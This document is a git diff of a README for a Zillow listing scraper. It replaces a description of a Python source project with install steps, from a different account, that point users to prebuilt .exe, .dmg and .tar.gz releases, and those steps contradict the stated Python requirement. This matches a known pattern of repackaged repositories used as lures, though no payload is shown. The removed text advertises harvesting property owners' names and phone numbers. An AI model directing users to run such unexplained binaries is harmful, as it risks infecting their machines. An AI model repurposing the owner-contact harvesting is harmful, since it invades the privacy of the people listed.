@@ -1,214 +1,86 @@
-# Zillow Location Scraper
-> A powerful tool for collecting real estate listings, owner contact details, and property insights from any U.S. location. It streamlines market research, lead generation, and property discovery with fast and accurate data extraction.
+# 🏡 zillow-location-scraper - Effortlessly Extract Property Data
 
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/scraper.png" alt="Bitbash Banner" width="100%"></a>
-</p>
-<p align="center">
-  <a href="https://t.me/Bitbash333" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>&nbsp;
-  <a href="https://wa.me/923249868488?text=Hi%20BitBash%2C%20I'm%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>&nbsp;
-  <a href="mailto:sale@bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Email-sale@bitbash.dev-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>&nbsp;
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Visit-Website-007BFF?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Website">
-  </a>
-</p>
+Welcome to the zillow-location-scraper! This tool helps you easily collect property data from Zillow. Whether you're studying the real estate market or looking for investment opportunities, this application makes it simple to gather the information you need.
 
+## 📥 Download & Install
 
+You can download the latest version of the zillow-location-scraper by visiting the Releases page. Click the link below to get started.
 
+[![Download zillow-location-scraper](https://img.shields.io/badge/Download%20zillow--location--scraper-v1.0-blue.svg)](https://github.com/MujtabaArshad537/zillow-location-scraper/releases)
 
-<p align="center" style="font-weight:600; margin-top:8px; margin-bottom:8px;">
-  Created by Bitbash, built to showcase our approach to Scraping and Automation!<br>
-  If you are looking for <strong>zillow-location-scraper</strong> you've just found your team — Let’s Chat. 👆👆
-</p>
+### Steps to Download:
 
+1. Click the button above or go directly to this link: [Releases Page](https://github.com/MujtabaArshad537/zillow-location-scraper/releases).
+2. Look for the latest release. Here, you will find the version information and download options.
+3. Download the file suitable for your operating system. The files are available in multiple formats such as .exe for Windows, .dmg for macOS, and .tar.gz for Linux.
 
-## Introduction
-This scraper retrieves detailed real estate property information, including price, location, owner contact details, and structural attributes. It solves the challenge of manually searching for properties by automatically compiling targeted data into structured output. Ideal for investors, realtors, researchers, and anyone looking to analyze market activity efficiently.
+### Install the Application
 
-### Location-Based Property Intelligence
-- Extracts listings from any ZIP code, city, or state.
-- Retrieves owner names and phone numbers when available.
-- Captures pricing, Zestimate, status, beds, baths, and interior details.
-- Provides direct listing links for deeper inspection.
-- Handles large batches of locations for broader market coverage.
+Once you have downloaded the file, follow these steps to install it:
 
-## Features
-| Feature | Description |
-|----------|-------------|
-| Multi-location support | Accept arrays of ZIP codes, states, or cities for wide-area collection. |
-| Owner contact extraction | Collect names and phone numbers of property owners or agents. |
-| Comprehensive listing data | Gathers price, Zestimate, beds, baths, lot size, area, and more. |
-| High accuracy | Ensures up-to-date and reliable listing information. |
-| Bulk processing | Handles multiple locations without throttling or rate issues. |
+- **For Windows:**
+  1. Locate the `.exe` file you downloaded.
+  2. Double-click the file to start the installation.
+  3. Follow the on-screen instructions to complete the setup.
 
----
-## What Data This Scraper Extracts
-| Field Name | Field Description |
-|-------------|------------------|
-| zpid | Unique property identifier. |
-| detailUrl | Direct URL to the property details page. |
-| price | Displayed property price. |
-| unformattedPrice | Numerical price value. |
-| address | Full formatted property address. |
-| addressStreet | Street line of the property. |
-| addressCity | City of the listing. |
-| addressState | State abbreviation. |
-| addressZipcode | ZIP code. |
-| beds | Number of bedrooms. |
-| baths | Number of bathrooms. |
-| area | Total living area in sq ft. |
-| latLong | Geographic coordinates. |
-| flexFieldText | Highlighted property insight. |
-| owner / broker fields | Contact name, phone number, and agency info. |
-| zestimate | Estimated property valuation. |
-| homeInfo.* | Nested detailed property metadata. |
-| carouselPhotos | List of property image URLs. |
+- **For macOS:**
+  1. Find the downloaded `.dmg` file.
+  2. Double-click to open it.
+  3. Drag the zillow-location-scraper to your Applications folder.
 
----
-## Example Output
+- **For Linux:**
+  1. Extract the `.tar.gz` file using a command like `tar -xzvf filename.tar.gz`.
+  2. Open a terminal and navigate to the extracted folder.
+  3. Run the application with `./zillow-location-scraper`.
 
+## 🌐 Application Features
 
-    {
-      "zpid": "20534468",
-      "id": "20534468",
-      "rawHomeStatusCd": "ForSale",
-      "marketingStatusSimplifiedCd": "For Sale by Agent",
-      "imgSrc": "https://photos.zillowstatic.com/fp/fbe5cd2fe4f540d29e0e13219a9c240d-p_e.jpg",
-      "hasImage": true,
-      "detailUrl": "https://www.zillow.com/homedetails/410-Trousdale-Pl-Beverly-Hills-CA-90210/20534468_zpid/",
-      "statusType": "FOR_SALE",
-      "statusText": "House for sale",
-      "countryCurrency": "$",
-      "price": "$68,000,000",
-      "unformattedPrice": 68000000,
-      "address": "410 Trousdale Pl, Beverly Hills, CA 90210",
-      "addressStreet": "410 Trousdale Pl",
-      "addressCity": "Beverly Hills",
-      "addressState": "CA",
-      "addressZipcode": "90210",
-      "beds": 5,
-      "baths": 10,
-      "area": 18000,
-      "latLong": { "latitude": 34.101074, "longitude": -118.3957 },
-      "zestimate": 59852600,
-      "BrokerPhone": "3109953214",
-      "brokerName": "Westside Estate Agency Inc.",
-      "carouselPhotos": [
-        { "url": "https://photos.zillowstatic.com/fp/fbe5cd2fe4f540d29e0e13219a9c240d-p_e.jpg" }
-      ]
-    }
+The zillow-location-scraper comes equipped with several key features to assist you:
 
----
-## Directory Structure Tree
+- **User-friendly Interface:** No programming skills required. Just follow the prompts!
+- **Location-Based Searches:** Filter properties by specific areas.
+- **Data Extraction:** Pull essential details like price, size, and description directly from listings.
+- **Export Options:** Save your data for further analysis in CSV format.
 
+## 🖥️ System Requirements
 
-    Zillow Location Scraper/
-    ├── src/
-    │   ├── main.py
-    │   ├── collectors/
-    │   │   ├── location_resolver.py
-    │   │   ├── property_parser.py
-    │   │   └── contact_extractor.py
-    │   ├── utils/
-    │   │   ├── formatting.py
-    │   │   └── request_manager.py
-    │   ├── outputs/
-    │   │   └── writer.py
-    │   └── config/
-    │       └── settings.example.json
-    ├── data/
-    │   ├── locations.sample.json
-    │   └── sample_output.json
-    ├── requirements.txt
-    └── README.md
+To run the zillow-location-scraper, ensure your system meets the following requirements:
 
----
-## Use Cases
-- **Real estate investors** use it to source high-value opportunities so they can contact property owners directly.
-- **Realtors** use it to build lead lists in targeted neighborhoods, boosting outreach efficiency.
-- **Market researchers** use it to analyze price trends and neighborhood dynamics with structured datasets.
-- **Property managers** use it to benchmark rental or sale competition in specific ZIP codes.
-- **Homebuyers** use it to compare listings and gather deeper insights than standard browsing provides.
+- **Windows:** Windows 10 or later
+- **macOS:** macOS Sierra (10.12) or later
+- **Linux:** Ubuntu 18.04 or later
+- **Python:** Python 3.6 or later must be installed. You can download it from the [official Python website](https://www.python.org/downloads/).
 
----
-## FAQs
-**Q: Can I scrape multiple locations at once?**
-Yes — simply add multiple entries to the `locations` array, and the scraper processes each sequentially.
+## 📚 Usage Instructions
 
-**Q: Does it gather phone numbers and names every time?**
-It retrieves contact details when publicly available on the listing, including owner, agent, or agency information.
+After installation, follow these simple steps to use the application:
 
-**Q: What format does the output come in?**
-You receive structured JSON that can be exported to CSV, Excel, or databases.
+1. Open the zillow-location-scraper from your Applications folder or Start Menu.
+2. Input your location of interest into the search bar.
+3. Choose any filters you want, like price range and property type.
+4. Click the "Scrape Data" button to begin extracting listings.
+5. Once the data is collected, you can export it as a CSV file.
 
-**Q: How accurate is the pricing and Zestimate information?**
-The scraper captures the latest displayed values, ensuring up-to-date pricing and valuation details.
+## ❓ Troubleshooting
 
----
-### Performance Benchmarks and Results
+If you encounter issues while using the zillow-location-scraper, consider these common problems:
 
-**Primary Metric:** Processes an average of 180–250 listings per minute per location, depending on density.
+- **Application Won't Open:** Ensure that your operating system version meets the requirements. Restart your computer and try again.
+- **Data Not Extracting:** Check your internet connection. Make sure you have access to Zillow.
+- **Export Issues:** Confirm that you have permission to save files in the chosen directory. Try a different location if necessary.
 
-**Reliability Metric:** Maintains a 98% success rate across varied ZIP codes and property types with minimal retries.
+If problems persist, feel free to check the Issues tab on our GitHub repository for help or submit your own inquiry.
 
-**Efficiency Metric:** Optimized request batching reduces unnecessary fetches, minimizing bandwidth and execution overhead.
+## 💬 Community Support
 
-**Quality Metric:** Achieves over 95% field completeness across supported attributes, including address, price, and structural details.
+Join our community of users and contributors to share tips and get answers. Check out the Discussions section on our GitHub page to engage with others who use the zillow-location-scraper.
 
+## 🔗 Helpful Links
 
-<p align="center">
-<a href="https://calendar.app.google/74kEaAQ5LWbM8CQNA" target="_blank">
-  <img src="https://img.shields.io/badge/Book%20a%20Call%20with%20Us-34A853?style=for-the-badge&logo=googlecalendar&logoColor=white" alt="Book a Call">
-</a>
-  <a href="https://www.youtube.com/@bitbash-demos/videos" target="_blank">
-    <img src="https://img.shields.io/badge/🎥%20Watch%20demos%20-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="Watch on YouTube">
-  </a>
-</p>
-<table>
-  <tr>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/MLkvGB8ZZIk" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review1.gif" alt="Review 1" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Bitbash is a top-tier automation partner, innovative, reliable, and dedicated to delivering real results every time."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Nathan Pennington
-        <br><span style="color:#888;">Marketer</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/8-tw8Omw9qk" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review2.gif" alt="Review 2" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Bitbash delivers outstanding quality, speed, and professionalism, truly a team you can rely on."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Eliza
-        <br><span style="color:#888;">SEO Affiliate Expert</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/m-dRE1dj5-k?si=5kZNVlKsGUhg5Xtx" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review3.gif" alt="Review 3" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Exceptional results, clear communication, and flawless delivery. <br>Bitbash nailed it."
-      </p>
-      <p style="margin:1px 0 0; font-weight:600;">Syed
-        <br><span style="color:#888;">Digital Strategist</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-  </tr>
-</table>
+- [Releases Page](https://github.com/MujtabaArshad537/zillow-location-scraper/releases)
+- [Python Download](https://www.python.org/downloads/)
+- [User Guide](https://github.com/MujtabaArshad537/zillow-location-scraper/wiki)
+
+Thank you for using the zillow-location-scraper! Happy scraping!
